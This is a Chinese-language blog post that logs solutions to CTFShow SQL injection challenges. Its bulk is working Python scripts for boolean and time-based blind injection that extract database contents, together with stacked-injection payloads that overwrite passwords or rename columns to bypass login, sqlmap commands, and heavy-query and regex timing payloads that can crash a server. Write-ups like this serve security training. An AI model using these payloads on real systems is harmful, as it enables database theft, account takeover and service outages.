<!DOCTYPE html><html lang="en" theme-mode="auto"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>CTFSHOW-SQL注入 | RacerZ</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light' || window.matchMedia('(prefers-color-scheme:light)').matches) document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark' || window.matchMedia('(prefers-color-scheme:dark)').matches) document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.1.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>CTFSHOW-SQL注入</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2022-09-07T16:00:00.000Z" id="date"> 2022-09-08</time></div></span><br><span>Last Update: <div class="control"><time datetime="2022-09-11T16:58:26.873Z" id="updated"> 2022-09-12</time></div></span></div></div><hr><div id="post-content"><h3 id="CTF-SHOW-SQL-做题记录"><a href="#CTF-SHOW-SQL-做题记录" class="headerlink" title="CTF-SHOW SQL 做题记录"></a>CTF-SHOW SQL 做题记录</h3><ol>
<li><p>盲注</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$sql = &quot;select pass from ctfshow_user where username = &#x27;&#123;$username&#125;&#x27;&quot;;<br></code></pre></td></tr></table></figure>
<p>回显点：密码错误与用户名不存在</p>
<p>过滤</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/file|into|ascii/i&#x27;</span>, <span class="hljs-variable">$username</span>)<br></code></pre></td></tr></table></figure>
<p>绕过 <code>ascii&lt;=&gt;ord</code></p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=gbk</span><br><span class="hljs-keyword">import</span> requests<br><br><br>url = <span class="hljs-string">&quot;http://cf76bf80-228d-441d-a697-07766df6cae6.challenge.ctf.show/api/&quot;</span><br><br><span class="hljs-comment"># 二分法查找</span><br>result = <span class="hljs-string">&quot;&quot;</span><br>i = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    i = i + <span class="hljs-number">1</span><br>    head = <span class="hljs-number">32</span><br>    tail = <span class="hljs-number">127</span><br>    <span class="hljs-keyword">while</span> head &lt; tail:<br>        mid = (head + tail) &gt;&gt; <span class="hljs-number">1</span><br>        <span class="hljs-comment"># 查版本</span><br>        <span class="hljs-comment">#payload = &quot;select version()&quot;</span><br>        <span class="hljs-comment"># 查表 ctfshow_fl0g,ctfshow_user</span><br>       <span class="hljs-comment"># payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema = database()&quot;</span><br>        <span class="hljs-comment"># 查列 id,f1ag</span><br>        <span class="hljs-comment"># payload = &quot;select group_concat(column_name) from information_schema.columns where table_name = &#x27;ctfshow_fl0g&#x27;&quot;</span><br>        <span class="hljs-comment"># 查值</span><br>        payload = <span class="hljs-string">&quot;select group_concat(id, f1ag) from ctfshow_fl0g&quot;</span><br>        data = &#123;<br>            <span class="hljs-string">&#x27;username&#x27;</span>:<span class="hljs-string">f&quot;admin&#x27; and if(ord(substr((<span class="hljs-subst">&#123;payload&#125;</span>),<span class="hljs-subst">&#123;i&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>,1,2)=&#x27;1&quot;</span>,<br>            <span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span><br>        &#125;<br>        r = requests.post(url, data=data)<br>        <span class="hljs-keyword">if</span>(r.json()[<span class="hljs-string">&#x27;msg&#x27;</span>]==<span class="hljs-string">&#x27;密码错误&#x27;</span>):<br>            head = mid + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            tail = mid<br>    <br>    <span class="hljs-keyword">if</span> head != <span class="hljs-number">32</span>:<br>        <span class="hljs-comment"># 检验最终位</span><br>        result += <span class="hljs-built_in">chr</span>(head)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure>
</li>
<li><p>盲注</p>
<p>ord改用正则</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=gbk</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://50fdc8ac-7670-400c-a757-1b73cecc96b2.challenge.ctf.show/api/&quot;</span><br><br>db = string.ascii_lowercase + string.digits + <span class="hljs-string">&quot;&#123;_-&#125;&quot;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">50</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> db:<br>        payload = <span class="hljs-string">&quot;select group_concat(id, f1ag) from ctfshow_fl0g&quot;</span><br>        data = &#123;<br>            <span class="hljs-string">&#x27;username&#x27;</span>:<span class="hljs-string">f&quot;admin&#x27; and if(substr((<span class="hljs-subst">&#123;payload&#125;</span>),<span class="hljs-subst">&#123;i&#125;</span>,1)regexp&#x27;<span class="hljs-subst">&#123;j&#125;</span>&#x27;,1,2)=&#x27;1&quot;</span>,<br>            <span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span><br>        &#125;<br>        r = requests.post(url, data=data)<br>        <span class="hljs-keyword">if</span>(r.json()[<span class="hljs-string">&#x27;msg&#x27;</span>]==<span class="hljs-string">&#x27;密码错误&#x27;</span>):<br>            flag += j<br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;&#125;&quot;</span> == j:<br>                exit(<span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">break</span>  <br>        time.sleep(<span class="hljs-number">0.1</span>)      <br></code></pre></td></tr></table></figure>
<ol>
<li><p>盲注</p>
<p>substr改用mid</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=gbk</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://3eea53d5-0746-4794-84c3-da7f7c73b5a1.challenge.ctf.show/api/&quot;</span><br><br>db = string.ascii_lowercase + string.digits + <span class="hljs-string">&quot;&#123;_-&#125;,&quot;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">50</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> db:<br>        <span class="hljs-comment"># </span><br>       <span class="hljs-comment"># payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema = database()&quot;</span><br>        <span class="hljs-comment">#payload = &quot;select group_concat(column_name) from information_schema.columns where table_name = &#x27;ctfshow_flxg&#x27;&quot;</span><br>        <span class="hljs-comment"># 查列 id,f1ag ctfshow_flxg ctfshow_user</span><br>        payload = <span class="hljs-string">&quot;select group_concat(id, f1ag) from ctfshow_flxg&quot;</span><br>        data = &#123;<br>            <span class="hljs-string">&#x27;username&#x27;</span>:<span class="hljs-string">f&quot;admin&#x27; and if(mid((<span class="hljs-subst">&#123;payload&#125;</span>),<span class="hljs-subst">&#123;i&#125;</span>,1)regexp&#x27;<span class="hljs-subst">&#123;j&#125;</span>&#x27;,1,2)=&#x27;1&quot;</span>,<br>            <span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span><br>        &#125;<br>        r = requests.post(url, data=data)<br>        <span class="hljs-keyword">if</span>(r.json()[<span class="hljs-string">&#x27;msg&#x27;</span>]==<span class="hljs-string">&#x27;密码错误&#x27;</span>):<br>            flag += j<br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;&#125;&quot;</span> == j:<br>                exit(<span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">break</span>  <br>        time.sleep(<span class="hljs-number">0.1</span>)      	<br></code></pre></td></tr></table></figure>
</li>
<li><p>盲注</p>
<p>不影响mid 没被过滤 </p>
<p>还有人用LOCATE、POSITION、INSTR、FIND_IN_SET、IN、LIKE一类</p>
</li>
<li><p>堆叠注入</p>
<p>直接根据之前查到的表暴力改密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">0;update`ctfshow_user`set`pass`=1;<br></code></pre></td></tr></table></figure>
</li>
<li><p>堆叠注入</p>
<p>限制了用户名长度 过滤的地方好像写错了</p>
<p>但是由于最后回显了1应该是绕过登陆了，比较玄</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1;select+1;<br></code></pre></td></tr></table></figure>
</li>
<li><p>堆叠注入</p>
<p>这里用到了堆叠的另一个应用，换列大法</p>
<p>使用<code>RENAME</code>关键字，将想要的数据列名/表名更改成返回数据的SQL语句所定义的表/列名</p>
<p>这题利用的是password为纯数字的特性，然后id也是纯数字。只需要将id列换成pass然后去匹配username那一列的id即可 (只不过不知道它这个username是咋知道的有0</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment"># coding=gbk</span><br><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://3c983893-89b6-4b85-a956-a2af007fee5a.challenge.ctf.show/api/&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">if</span> i == <span class="hljs-number">0</span>:<br>        data = &#123;<br>            <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;1;alter table `ctfshow_user` change column `pass` `whatever` varchar(255);alter table `ctfshow_user` change column `id` `pass` varchar(255);&quot;</span>,<br>            <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;i&#125;</span>&quot;</span><br>        &#125;<br>        r = requests.post(url, data=data)<br>    data = &#123;<br>        <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&#x27;0&#x27;</span>,<br>        <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;i&#125;</span>&quot;</span><br>    &#125;<br>    r = requests.post(url, data=data)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;登陆成功&quot;</span> <span class="hljs-keyword">in</span> r.json()[<span class="hljs-string">&#x27;msg&#x27;</span>]:<br>        <span class="hljs-built_in">print</span>(r.json()[<span class="hljs-string">&#x27;msg&#x27;</span>])<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
</li>
<li><p>堆叠注入 继续打 alter没被过滤</p>
</li>
<li><p>堆叠注入 把<code>(</code>给过滤了 这里的用法跟196一样 思路就是改回显数据为我们已知的，只不过这道题的<code>select</code>被ban了，但我们知道表名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1;show tables;<br></code></pre></td></tr></table></figure>
</li>
<li><p>堆叠注入 多了个过滤<code>,</code>原理一样</p>
</li>
<li><p>sqlmap 直接探测好想不大行 加 —refer 常规查即可</p>
</li>
<li><p>sqlmap data传参</p>
</li>
<li><p>sqlmap 该用put提交？ 另外请求url变化了不太明白。由于PUT提交这里还需要注意的是需要改变请求头中的数据类型，免得被识别成表单数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">sqlmap -u &quot;u/api/index.php&quot; --method=&quot;PUT&quot; --refers=&quot;ctf.show&quot; --headers=&quot;Content-Type: text/plain;&quot; --data=&quot;id=1&quot; <br></code></pre></td></tr></table></figure>
</li>
<li><p>sqlmap 在之前的基础上加上cookie的数据</p>
</li>
<li><p>sqlmap 需要鉴权 可以看到在访问api之前还需要去请求一个getToken页面，所以利用sqlmap设置好注入测试期间需要访问的页面及次数</p>
<p class='item-img' data-src='/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220818192902086.png'><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220818192902086.png" alt="image-20220818192902086"></p>
</li>
<li><p>时间盲注</p>
<p>主要是找注入点比较难搞，不知道他们咋找到的参数</p>
<p class='item-img' data-src='/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220821000503093.png'><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220821000503093.png" alt="image-20220821000503093"></p>
</li>
</ol>
<p>POC and 好像被过滤了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ip=-1 or if(1=1,sleep(3),1)%23<br></code></pre></td></tr></table></figure>
<p>这里还学到了写脚本当中request方法中的timeout参数，超时则会抛出异常</p>
<p class='item-img' data-src='/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220821002449867.png'><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220821002449867.png" alt="image-20220821002449867"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=gbk</span><br><br><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://a6530d33-5713-4b2d-aff5-b818b24742ea.challenge.ctf.show/api/&quot;</span><br><br>result = <span class="hljs-string">&quot;&quot;</span><br>i = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    i += <span class="hljs-number">1</span><br>    head = <span class="hljs-number">32</span><br>    tail = <span class="hljs-number">127</span><br>    <span class="hljs-keyword">while</span> head &lt; tail:<br>        <span class="hljs-comment">#payload = &quot;select version()&quot;  </span><br>        <span class="hljs-comment">#payload = &quot;select database()&quot; </span><br>        <span class="hljs-comment">#payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema = database()&quot; </span><br>        <span class="hljs-comment">#payload = &quot;select group_concat(column_name) from information_schema.columns where table_name = &#x27;ctfshow_flagx&#x27;&quot;   </span><br>        payload = <span class="hljs-string">&quot;select group_concat(flaga) from ctfshow_flagx&quot;</span> <br>        mid = (head + tail) &gt;&gt; <span class="hljs-number">1</span><br>        data = &#123;<br>            <span class="hljs-string">&#x27;ip&#x27;</span>: <span class="hljs-string">f&quot;if((ascii(substr((<span class="hljs-subst">&#123;payload&#125;</span>),<span class="hljs-subst">&#123;i&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>),sleep(1),1)&quot;</span>,<br>            <span class="hljs-string">&#x27;debug&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span><br>        &#125;<br>        <span class="hljs-keyword">try</span>:<br>            r = requests.post(url, data=data, timeout=<span class="hljs-number">1</span>)<br>            tail = mid<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            head = mid + <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">if</span> head != <span class="hljs-number">32</span>:<br>        result += <span class="hljs-built_in">chr</span>(head)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure>
<ol>
<li><p>时间盲注</p>
<p>加了单引号闭合</p>
<p>POC</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ip=123&#x27; or if(1=(select 1),sleep(3),1)#&amp;debug=1<br></code></pre></td></tr></table></figure>
<p>继续打</p>
</li>
<li><p>时间盲注，解base64。搞不明白它们这个参数是咋设置的。。。</p>
<p>想明白了语句应该是这样</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select id from ctfshow_info where id=from_base64($ip);<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220821010336365.png'><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220821010336365.png" alt="image-20220821010336365" style="zoom:50%;"></p>
<p class='item-img' data-src='/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220821011728324.png'><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220821011728324.png" alt="image-20220821011728324"></p>
<p>刚开始想的直接把整个注入语句进行编码就行。但是不太行，应该是它这个参数换了的原因…。所以就沿用闭合语句的方式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ip=&#x27;&#x27;) or if(1=(select 1),sleep(3),1)#<br></code></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=gbk</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64encode<br><br>url = <span class="hljs-string">&quot;http://e299192d-1775-4b13-90a7-41900827d68e.challenge.ctf.show/api/&quot;</span><br><br>result = <span class="hljs-string">&quot;&quot;</span><br>i = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    i += <span class="hljs-number">1</span><br>    head = <span class="hljs-number">32</span><br>    tail = <span class="hljs-number">127</span><br>    <span class="hljs-keyword">while</span> head &lt; tail:<br>        <span class="hljs-comment">#payload = &quot;select version()&quot;  </span><br>        <span class="hljs-comment">#payload = &quot;select database()&quot; </span><br>        payload = <span class="hljs-string">&quot;select group_concat(table_name) from information_schema.tables where table_schema = database()&quot;</span> <br>        <span class="hljs-comment">#payload = &quot;select group_concat(column_name) from information_schema.columns where table_name = &#x27;ctfshow_flagxc&#x27;&quot;   </span><br>        <span class="hljs-comment">#payload = &quot;select group_concat(flagaa) from ctfshow_flagxc&quot; </span><br>        mid = (head + tail) &gt;&gt; <span class="hljs-number">1</span><br>        data = &#123;<br>            <span class="hljs-string">&#x27;ip&#x27;</span>: <span class="hljs-string">f&quot;&#x27;&#x27;) or if((ascii(substr((<span class="hljs-subst">&#123;payload&#125;</span>),<span class="hljs-subst">&#123;i&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>),sleep(1),1)#&quot;</span>,<br>            <span class="hljs-string">&#x27;debug&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span><br>        &#125;<br>        <span class="hljs-keyword">try</span>:<br>            r = requests.post(url, data=data, timeout=<span class="hljs-number">1</span>)<br>            tail = mid<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            head = mid + <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">if</span> head != <span class="hljs-number">32</span>:<br>        result += <span class="hljs-built_in">chr</span>(head)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure>
</li>
<li><p>时间盲注</p>
<p>语句闭合采用括号的形式，sleep函数终于也被ban了。试试新的benchmark</p>
<p><code>执行表达式exp，count次（消耗CPU）</code></p>
<p class='item-img' data-src='/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220822123554567.png'><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220822123554567.png" alt="image-20220822123554567" style="zoom:50%;"></p>
<p>POC</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ip=1) or if(1=2, benchmark(1000000, md5(1)), 1)<br></code></pre></td></tr></table></figure>
</li>
<li><p>时间盲注</p>
<p>这次把<code>benchmark</code>也给屏蔽了</p>
<p>这里便引出第三种时间盲注的方法：<strong>笛卡尔积</strong></p>
<p>我们将mysql内置库表进行笛卡尔积查询，其查询开销将变得巨大</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select count(*) from information_schema.columns A,information_schema.columns B;<br></code></pre></td></tr></table></figure>
</li>
</ol>
<pre><code> &lt;img src=&quot;/image-20220828125029627.png&quot; alt=&quot;image-20220828125029627&quot; style=&quot;zoom:50%;&quot; /&gt;

 POC

 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ip=1) or if(1=2, (select count(*) from information_schema.columns A,information_schema.columns B), 1)#<br></code></pre></td></tr></table></figure>
</code></pre><p>不过容易直接把服务器搞崩，估摸着是并两个表就已经很长时间了导致的，最多能延个5s左右</p>
<p>利用RLIKE REGEXP正则匹配</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select rpad(&#x27;a&#x27;,4999999,&#x27;a&#x27;) RLIKE concat(repeat(&#x27;(a.*)+&#x27;,30),&#x27;b&#x27;);<br> ​<br> 正则语法：<br> . : 匹配任意单个字符<br> * ： 匹配0个或多个前一个得到的字符<br> [] : 匹配任意一个[]内的字符，[ab]*可匹配空串、a、b、或者由任意个a和b组成的字符串。<br> ^ : 匹配开头，如^s匹配以s或者S开头的字符串。<br> $ : 匹配结尾，如s$匹配以s结尾的字符串。<br> &#123;n&#125; : 匹配前一个字符反复n次。<br><br> RPAD(str,len,padstr)<br> 用字符串 padstr对 str进行右边填补直至它的长度达到 len个字符长度，然后返回 str。如果 str的长度长于 len&#x27;，那么它将被截除到 len个字符。<br> mysql&gt; SELECT RPAD(&#x27;hi&#x27;,5,&#x27;?&#x27;); -&gt; &#x27;hi???&#x27;<br> ​<br> repeat(str,times)  复制字符串times次<br></code></pre></td></tr></table></figure>
